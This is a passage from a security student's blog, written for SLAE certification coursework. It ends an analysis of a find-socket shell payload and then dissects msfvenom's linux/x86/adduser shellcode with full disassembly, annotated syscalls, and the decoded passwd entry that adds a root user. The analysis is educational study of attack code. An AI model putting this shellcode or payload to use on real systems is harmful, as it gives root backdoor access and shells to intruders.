<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x2</span>        <span class="c">; Store 2</span>
<span class="k">pop</span> <span class="n">ecx</span>               <span class="c">; in ecx (counter)</span>

<span class="c">; dup2-loop:</span>
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x3f</span>       <span class="c">; push 63 (syscall for dup2)</span>
<span class="k">pop</span> <span class="n">eax</span>               <span class="c">; into eax</span>
<span class="k">int</span> <span class="mh">0x80</span>              <span class="c">; Syscall </span>
<span class="k">dec</span> <span class="n">ecx</span>               <span class="c">; From 2 to 0 (stdin, stdout and stderr..</span>
<span class="k">jns</span> <span class="mh">0x26</span>              <span class="c">; not zero yet, loop 'dup2-loop'</span>

<span class="c">; Execve</span>
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0xb</span>        <span class="c">; Put 11 in </span>
<span class="k">pop</span> <span class="n">eax</span>               <span class="c">; eax (syscall for execve)</span>
<span class="k">cdq</span> 
<span class="k">push</span> <span class="n">edx</span>              <span class="c">; Push "/bin//sh0"</span>
<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x68732f2f</span> <span class="c">; to stack</span>
<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x6e69622f</span> <span class="c">; </span>
<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>           <span class="c">; and set pointer to string</span>
<span class="k">push</span> <span class="n">edx</span>              <span class="c">; NULLL</span>
<span class="k">push</span> <span class="n">ebx</span>              <span class="c">; Pointer to array</span>
<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span><span class="n">esp</span>           <span class="c">; in ecx</span>
<span class="k">int</span> <span class="mh">0x80</span>              <span class="c">; Execute syscall</span>
</code></pre>
</div>
<p>So the payload searches through all open connections (sockfd:s) looking for the specified ‘TAG’-value (in our case ‘b37x’). When the TAG is found, a shell is spawned on the connection (after the file descriptors have been duplicated with ‘dup2’).</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-5/" title="SLAE Assignment 5 (1/3)"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 5 (1/3)"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-05-03T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-5/">May 03, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~4 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-5/" rel="bookmark" title="SLAE Assignment 5 (1/3)" itemprop="url">SLAE Assignment 5 (1/3)</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="dissecting-msfvenom-payloads-linuxx86">Dissecting Msfvenom Payloads (Linux/x86)</h1>

<h2 id="requirements">Requirements</h2>

<ul>
  <li>Take up at least 3 shellcode samples created using msfvenom  for linux/x86</li>
  <li>Use GDB/Ndisasm/Libemu to dissect the
funcSonality of the shellcode</li>
  <li>Present your analysis</li>
</ul>

<h2 id="linuxx86adduser">linux/x86/adduser</h2>

<p>The first payload is “linux/x86/adduser”. 
First we generate the payload by using msfvenom for architecture x86 and pipe the result to ‘ndisasm’ (which will output the opcodes and instructions):</p>

<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ msfvenom -p linux/x86/adduser -a x86 R | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes

00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E828000000        call dword 0x53
0000002B  6D                insd
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsd
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push edx
00000042  633A              arpl [edx],di
00000044  303A              xor [edx],bh
00000046  303A              xor [edx],bh
00000048  3A2F              cmp ch,[edi]
0000004A  3A2F              cmp ch,[edi]
0000004C  62696E            bound ebp,[ecx+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80


</code></pre>
</div>

<p>For clarity and to make it easier to read, I have removed the opcodes and is only showing the instructions in the analysis.</p>

<p>The comments are my addition.</p>

<ul>
  <li>There are some int 0x80-instructions in the code.</li>
  <li>Split into sections</li>
  <li>Look up the syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h</li>
  <li>Figure out the arguments for each syscall</li>
  <li>Comment the section</li>
</ul>

<p>The first ‘section’ executes the syscall for ‘setreuid(0)’, which sets privileges.:</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;; int setreuid(uid_t ruid, uid_t euid);</span>
<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>             <span class="c">; Zero out ecx</span>
<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">ecx</span>             <span class="c">; and ebx</span>
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x46</span>         <span class="c">; Put 0x46 (70) on the stack</span>
<span class="k">pop</span> <span class="n">eax</span>                 <span class="c">; ..and into eax</span>
<span class="k">int</span> <span class="mh">0x80</span>                <span class="c">; Execute syscall 70 (setreuid)</span>
</code></pre>
</div>

<p>The next section executes the syscall for ‘open()’, which opens the file ‘/etc//passwd’ in write_only/append-mode. The double slash between etc and passwd is to make the string divisible by 4. 
The value in ecx is the flags for the mode in which the file will open, and in this case it’s 
O_WRONLY (01) and O_APPEND (02000), specified in the file ‘/usr/include/asm-generic/fcntl.h
‘.</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;; int open(const char *pathname, int flags);</span>
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x5</span>          
<span class="k">pop</span> <span class="n">eax</span>
<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<span class="k">push</span> <span class="n">ecx</span>
<span class="c">; Push the string '/etc//passwd' (reverse)</span>
<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x64777373</span>   <span class="c">; dwss</span>
<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x61702f2f</span>   <span class="c">; ap// </span>
<span class="k">push</span> <span class="n">dword</span> <span class="mh">0x6374652f</span>   <span class="c">; cte/</span>
<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span><span class="n">esp</span>             <span class="c">; Pointer to address of "/etc//passwd"</span>
<span class="k">inc</span> <span class="n">ecx</span>                 <span class="c">; ecx = 1 </span>
<span class="k">mov</span> <span class="n">ch</span><span class="p">,</span><span class="mh">0x4</span>              <span class="c">; ch = 4 =&gt; ecx 0100 0001 = 1025 </span>
<span class="k">int</span> <span class="mh">0x80</span>
</code></pre>
</div>

<p>The next section saves the file descriptor and jumps (call) to another section in the code:</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xchg</span> <span class="n">eax</span><span class="p">,</span><span class="n">ebx</span> 			<span class="c">; Swap eax and ebx (saves file descriptor)</span>
<span class="k">call</span> <span class="n">dword</span> <span class="mh">0x53</span> 		<span class="c">; Call address at byte 53 in the disassembly</span>
</code></pre>
</div>

<p>The section that follows seems to be scrambled or disassembled incorrectly. 
One indicator that this is the case is the fact that the call instruction jumps to the addres 0x53. But that byte is “inside” another instruction if you belive the disassembly:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>00000052  0A598B            or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld
</code></pre>
</div>
<p>By ‘extracting’ the opcodes from 0x53 to 0x56 (0x57 has valid opcodes) we can see what the instructions are:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ echo -e "\x59\x8B\x51\xFC" | ndisasm -u -
00000000  59                pop ecx
00000001  8B51FC            mov edx,[ecx-0x4]
</code></pre>
</div>

<p>Then comes the incorrectly disassebled opcodes, which we will skip for now.</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; Incorrectly disassebled opcodes</span>
<span class="k">insd</span>
<span class="n">gs</span> <span class="k">jz</span> <span class="mh">0x90</span>
<span class="k">jnc</span> <span class="mh">0xa1</span>
<span class="k">insb</span>
<span class="k">outsd</span>
<span class="k">imul</span> <span class="n">esi</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="n">edi</span><span class="o">+</span><span class="mh">0x41</span><span class="err">]</span><span class="p">,</span><span class="n">dword</span> <span class="mh">0x49642f7a</span>
<span class="k">jnc</span> <span class="mh">0xa7</span>
<span class="k">xor</span> <span class="n">al</span><span class="p">,</span><span class="mh">0x70</span>
<span class="k">xor</span> <span class="n">al</span><span class="p">,</span><span class="mh">0x49</span>
<span class="k">push</span> <span class="n">edx</span>
<span class="k">arpl</span> <span class="p">[edx],</span><span class="n">di</span>
<span class="k">xor</span> <span class="p">[edx],</span><span class="n">bh</span>
<span class="k">xor</span> <span class="p">[edx],</span><span class="n">bh</span>
<span class="k">cmp</span> <span class="n">ch</span><span class="p">,[edi]</span>
<span class="k">cmp</span> <span class="n">ch</span><span class="p">,[edi]</span>
<span class="k">bound</span> <span class="n">ebp</span><span class="p">,</span><span class="err">[</span><span class="n">ecx</span><span class="o">+</span><span class="mh">0x6e</span><span class="err">]</span>
<span class="k">das</span>
<span class="k">jnc</span> <span class="mh">0xba</span>
<span class="k">or</span> <span class="n">bl</span><span class="p">,</span><span class="err">[</span><span class="n">ecx</span><span class="o">-</span><span class="mh">0x75</span><span class="err">]</span>
</code></pre>
</div>

<p>The last section writes the file (remember, ebx still contains the file descriptor) to disk and then exits.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; Write </span>
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x4</span> 			<span class="c">; Put the value "4"</span>
<span class="k">pop</span> <span class="n">eax</span>				<span class="c">; in eax</span>
<span class="k">int</span> <span class="mh">0x80</span> 			<span class="c">; Execute syscall 4 (Write)</span>

<span class="c">; Exit</span>
<span class="k">push</span> <span class="n">byte</span> <span class="o">+</span><span class="mh">0x1</span> 			<span class="c">; Put the value "1"</span>
<span class="k">pop</span> <span class="n">eax</span>				<span class="c">; in eax</span>
<span class="k">int</span> <span class="mh">0x80</span> 			<span class="c">; Execute syscall 1 (Exit)</span>
</code></pre>
</div>

<p>So what is hidden in the incorrectly disassebled opcodes?
If we extract the ‘opcodes’ (or the values) between positions 0x2B and 0x57, we get this:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>\x6D65746173706C6F69743A417A2F6449736A3470344952633A303A303A3A2F3A2F62696E2F73680A
</code></pre>
</div>
<p>All those values seems to be inside of the printable ascii area. If we convert the hex values to ascii (by using for example <a href="http://www.asciitohex.com/">http://www.asciitohex.com/</a>) we get this string:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
</code></pre>
</div>
<p>which is to add the user ‘metasploit’ with password ‘metasploit’.</p>

<p>So the shellcode performs these steps:</p>
<ul>
  <li>Calls setreuid(0), which gets root privileges</li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>Calls open(“/etc/passwd”, O_RDONLY</td>
          <td>O_APPEND)</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>Writes (appends) the string ‘metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh’ to the file.</li>
  <li>Writes the file to disk</li>
  <li>Exit the program.</li>
</ul>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

<p>test</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->



<div class="pagination">
  <ul class="inline-list">
    
    

    
    
      <li><strong class="current-page">1</strong></li>
    

    
    

    
    
    

    

    
    

    
      <li><a href="https://rtmcx.github.io/page2/">2</a></li>
    

    
    
      <li><a href="https://rtmcx.github.io/page2/" class="btn">Next</a></li>
    
  </ul>
</div>


</div><!-- /#main -->

<div class="footer-wrapper">
  <footer role="contentinfo">
    <span>&copy; 2017 rtmcx. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>
  </footer>
</div><!-- /.footer-wrapper -->

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script>window.jQuery || document.write('<script src="https://rtmcx.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
<script src="https://rtmcx.github.io/assets/js/scripts.min.js"></script>



          

</body>
</html>